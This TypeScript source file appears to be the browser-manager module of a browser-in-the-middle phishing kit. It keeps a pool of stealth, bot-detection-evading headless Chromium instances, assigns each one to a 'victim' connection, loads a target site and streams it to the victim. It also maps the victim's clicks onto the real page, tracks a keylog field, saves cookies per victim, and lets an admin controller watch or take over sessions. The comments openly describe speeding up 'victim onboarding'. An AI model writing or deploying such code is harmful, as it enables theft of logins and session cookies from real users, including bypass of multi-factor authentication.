import { chromium } from 'playwright-extra';
import StealthPlugin from 'puppeteer-extra-plugin-stealth';
import { randomUUID } from 'crypto';
import { mkdir } from 'fs/promises';
import { join } from 'path';
import { fileURLToPath } from 'url';
import { dirname } from 'path';
import type { BrowserContext } from 'playwright';
import type { BrowserInstance, Target, Config } from './types.js';
import { startScreencast } from './screencast.js';

const __dirname = dirname(fileURLToPath(import.meta.url));
const USER_DATA_ROOT = join(__dirname, '..', 'user_data');

// Apply stealth plugin to avoid detection by anti-bot systems
chromium.use(StealthPlugin());

// ═══════════════════════════════════════════════════════════════════════════════
// Constants
// ═══════════════════════════════════════════════════════════════════════════════

/**
 * Maximum number of concurrent victim sessions allowed.
 * Prevents resource exhaustion from too many simultaneous browser instances.
 * Each browser instance consumes ~200-500MB of RAM.
 */
export const MAX_CONCURRENT_VICTIMS = 10;

// ═══════════════════════════════════════════════════════════════════════════════
// Module State
// ═══════════════════════════════════════════════════════════════════════════════

/**
 * Pool of active browser instances, keyed by browser ID (UUID).
 * Only contains claimed instances (actively used by victims).
 */
const pool = new Map<string, BrowserInstance>();

/**
 * Pre-warmed browser instance ready for immediate claiming.
 * Kept in standby to reduce victim onboarding latency.
 * Null when no warm instance is available (e.g., during startup or after claiming).
 */
let warmInstance: BrowserInstance | null = null;

/**
 * Application configuration (loaded at startup).
 * Contains proxy settings, user agent, etc.
 */
let appConfig: Config | null = null;

/**
 * Callback function for broadcasting thumbnails to admin clients.
 * Set during initialization via initBrowserManager().
 */
let onThumbnailCallback: ((browserId: string, buf: Buffer) => void) = () => {};

// ═══════════════════════════════════════════════════════════════════════════════
// Initialization
// ═══════════════════════════════════════════════════════════════════════════════

/**
 * Initializes the browser manager with application configuration.
 * Must be called before any other browser manager functions.
 * 
 * @param config - Application configuration (proxy, user agent, etc.)
 * @param onThumbnail - Callback for broadcasting thumbnails to admins
 */
export function initBrowserManager(
  config: Config,
  onThumbnail: (browserId: string, buf: Buffer) => void,
): void {
  appConfig = config;
  onThumbnailCallback = onThumbnail;
}

/**
 * Pre-warms a browser instance for faster victim onboarding.
 * Creates a ready-to-use browser that can be claimed immediately.
 * 
 * This significantly reduces the time between victim connection and
 * first frame display (from ~3-5s to ~500ms).
 */
export async function warmUp(): Promise<void> {
  console.log('[browser-manager] Pre-warming browser instance...');
  await createWarmBrowser();
  console.log('[browser-manager] Warm instance ready.');
}

// ═══════════════════════════════════════════════════════════════════════════════
// Instance Claiming
// ═══════════════════════════════════════════════════════════════════════════════

/**
 * Claims a browser instance for a new victim session.
 * 
 * Process:
 * 1. Check concurrent victim limit
 * 2. Grab the pre-warmed instance (if available)
 * 3. Start creating a new warm instance in the background
 * 4. Configure the claimed instance (viewport, target URL, screencast)
 * 5. Add to active pool
 * 
 * @param victimSocketId - Socket.IO socket ID of the victim
 * @param victimWidth - Victim's viewport width in pixels
 * @param victimHeight - Victim's viewport height in pixels
 * @param target - Target site configuration
 * @returns Configured browser instance ready for use
 * @throws Error if server is at capacity (MAX_CONCURRENT_VICTIMS reached)
 */
export async function claimInstance(
  victimSocketId: string,
  victimWidth: number,
  victimHeight: number,
  target: Target,
): Promise<BrowserInstance> {
  // Enforce concurrent victim limit to prevent resource exhaustion
  const activeVictims = [...pool.values()].filter(i => i.claimed && i.victimSocket !== null).length;
  if (activeVictims >= MAX_CONCURRENT_VICTIMS) {
    throw new Error(`Server at capacity: ${MAX_CONCURRENT_VICTIMS} concurrent victims maximum`);
  }

  // Grab the pre-warmed instance (fast path)
  const instance = warmInstance;
  warmInstance = null;

  // Immediately start creating a new warm instance in the background
  // This ensures the next victim also gets fast onboarding
  void createWarmBrowser();

  // Edge case: no warm instance available (e.g., first victim before warmUp() completes)
  if (!instance) {
    console.warn('[browser-manager] No warm instance available — creating cold instance');
    return createAndClaimCold(victimSocketId, victimWidth, victimHeight, target);
  }

  // Configure the claimed instance for this victim
  instance.victimSocket = victimSocketId;
  instance.target = target;
  instance.claimed = true;
  instance.connectedAt = new Date();

  /**
   * Compute coordinate scale factors for translating victim's screen coordinates
   * to Playwright's viewport coordinates.
   * 
   * Example: If target is 1920x1080 and victim's screen is 1280x720:
   * - scaleX = 1920 / 1280 = 1.5
   * - scaleY = 1080 / 720 = 1.5
   * 
   * When victim clicks at (100, 100), we translate to (150, 150) in Playwright.
   */
  instance.scaleX = target.width / victimWidth;
  instance.scaleY = target.height / victimHeight;

  // Set browser viewport to match target dimensions
  await instance.page.setViewportSize({ width: target.width, height: target.height });

  // Navigate to the target URL
  await instance.page.goto(target.url, { waitUntil: 'domcontentloaded' });

  // Start screencast (frame capture via CDP)
  // Controller is stored on instance indirectly via cdpSession; stop via closeBrowser
  await startScreencast(instance, onThumbnailCallback);

  // Add to active pool
  pool.set(instance.id, instance);
  console.log(`[browser-manager] Claimed instance ${instance.id} for victim ${victimSocketId}`);
  return instance;
}

// ═══════════════════════════════════════════════════════════════════════════════
// Instance Lookup
// ═══════════════════════════════════════════════════════════════════════════════

/**
 * Retrieves a browser instance by its unique ID.
 * 
 * @param browserId - Browser instance UUID
 * @returns Browser instance or undefined if not found
 */
export function getInstanceById(browserId: string): BrowserInstance | undefined {
  return pool.get(browserId);
}

/**
 * Retrieves a browser instance by associated socket ID.
 * Searches for instances where the socket is either the victim or controller.
 * 
 * @param socketId - Socket.IO socket ID (victim or admin)
 * @returns Browser instance or undefined if not found
 */
export function getInstanceBySocket(socketId: string): BrowserInstance | undefined {
  for (const instance of pool.values()) {
    if (instance.victimSocket === socketId || instance.controllerSocket === socketId) {
      return instance;
    }
  }
  return undefined;
}

/**
 * Retrieves all active browser instances.
 * 
 * @returns Array of all browser instances in the pool
 */
export function getAllInstances(): BrowserInstance[] {
  return [...pool.values()];
}

// ═══════════════════════════════════════════════════════════════════════════════
// Instance Cleanup
// ═══════════════════════════════════════════════════════════════════════════════

/**
 * Closes a browser instance and releases its resources.
 * 
 * Cleanup sequence:
 * 1. Remove from active pool
 * 2. Detach CDP session (stops screencast)
 * 3. Close browser context (saves cookies/storage, releases memory)
 * 
 * @param browserId - Browser instance UUID to close
 */
export async function closeBrowser(browserId: string): Promise<void> {
  const instance = pool.get(browserId);
  if (!instance) return;

  pool.delete(browserId);

  // Detach CDP session (stops screencast)
  try {
    if (instance.cdpSession) {
      await instance.cdpSession.detach();
    }
  } catch { /* ignore - session may already be detached */ }

  // Close browser context (saves persistent data, releases resources)
  try {
    await instance.context.close();
  } catch { /* ignore - context may already be closed */ }

  console.log(`[browser-manager] Closed instance ${browserId}`);
}

/**
 * Closes all active browser instances and the warm instance.
 * Called during graceful shutdown.
 */
export async function closeAll(): Promise<void> {
  const ids = [...pool.keys()];
  await Promise.all(ids.map(closeBrowser));

  // Close warm instance if it exists
  if (warmInstance) {
    try { await warmInstance.context.close(); } catch { /* ignore */ }
    warmInstance = null;
  }
}

// ═══════════════════════════════════════════════════════════════════════════════
// Internal Helper Functions
// ═══════════════════════════════════════════════════════════════════════════════

/**
 * Creates a new warm browser instance in the background.
 * Errors are logged but don't crash the server (warm instance is optional).
 */
async function createWarmBrowser(): Promise<void> {
  try {
    const instance = await createBrowserInstance();
    warmInstance = instance;
  } catch (err) {
    console.error(`[browser-manager] Failed to create warm browser: ${(err as Error).message}`);
  }
}

/**
 * Creates a new browser instance with persistent storage.
 * 
 * Each instance gets:
 * - Unique user data directory (for cookies, localStorage, etc.)
 * - Stealth plugin (to avoid bot detection)
 * - Custom user agent (from config)
 * - Optional proxy (from config)
 * 
 * @returns Unconfigured browser instance (not yet claimed)
 */
async function createBrowserInstance(): Promise<BrowserInstance> {
  const id = randomUUID();
  const userDataDir = join(USER_DATA_ROOT, id);
  await mkdir(userDataDir, { recursive: true });

  const launchOptions: Parameters<typeof chromium.launchPersistentContext>[1] = {
    headless: true,
    args: [
      '--no-sandbox',
      '--disable-setuid-sandbox',
      '--disable-dev-shm-usage',
      '--disable-blink-features=AutomationControlled',
      '--disable-infobars',
      '--window-size=1920,1080',
    ],
    userAgent: appConfig?.default_user_agent,
    ...(appConfig?.proxy ? { proxy: { server: appConfig.proxy } } : {}),
  };

  const context: BrowserContext = await chromium.launchPersistentContext(
    userDataDir,
    launchOptions,
  );

  const page = await context.newPage();
  await page.goto('about:blank');

  const instance: BrowserInstance = {
    id,
    victimSocket: null,
    controllerSocket: null,
    target: null,
    onFrame: () => {}, // replaced after claim
    scaleX: 1,
    scaleY: 1,
    context,
    page,
    cdpSession: null,
    connectedAt: null,
    claimed: false,
    keylog: '',
  };

  return instance;
}

/**
 * Creates and immediately claims a browser instance (cold start).
 * Used as fallback when no warm instance is available.
 * 
 * This is slower than claiming a warm instance (~3-5s vs ~500ms)
 * but ensures victims can always connect even during high load.
 * 
 * @param victimSocketId - Socket.IO socket ID of the victim
 * @param victimWidth - Victim's viewport width in pixels
 * @param victimHeight - Victim's viewport height in pixels
 * @param target - Target site configuration
 * @returns Configured browser instance ready for use
 */
async function createAndClaimCold(
  victimSocketId: string,
  victimWidth: number,
  victimHeight: number,
  target: Target,
): Promise<BrowserInstance> {
  const instance = await createBrowserInstance();

  instance.victimSocket = victimSocketId;
  instance.target = target;
  instance.claimed = true;
  instance.connectedAt = new Date();
  instance.scaleX = target.width / victimWidth;
  instance.scaleY = target.height / victimHeight;

  await instance.page.setViewportSize({ width: target.width, height: target.height });
  await instance.page.goto(target.url, { waitUntil: 'domcontentloaded' });

  await startScreencast(instance, onThumbnailCallback);

  pool.set(instance.id, instance);
  return instance;
}